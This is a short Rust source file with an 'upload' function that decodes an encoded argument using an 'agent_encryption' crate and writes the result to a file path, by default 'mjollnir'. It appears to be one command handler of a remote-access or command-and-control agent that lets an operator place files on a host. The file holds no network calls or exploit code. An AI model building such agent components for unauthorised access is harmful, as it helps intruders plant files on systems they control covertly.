use std::io::prelude::*;
use std::fs::File;

use agent_encryption::*;

pub fn upload(cmd_arg: String) -> (String, String) {
    //println!("cmd_arg: {:#?}", cmd_arg);
    let mut iter = cmd_arg.split_whitespace();
    let datas_str = iter.next();
    let remote_path = iter.next();

    let remote_path_str: &str = match remote_path {
        None => {"mjollnir"},
        Some(ref path) => {path},
    };

    let datas: Vec<u8> = match datas_str {
        None => {vec![0x0A]},
        Some(ref bytes) => {
            upload_decoding(bytes.to_string())
        } 
    };

    let mut fp = File::create(remote_path_str).expect("cannot create file");
    fp.write(&datas).expect("cannot write data to file");

    let scan_result: String = "uploaded".to_string();
    let scan_error: String = "".to_string();
    (scan_result, scan_error)
}
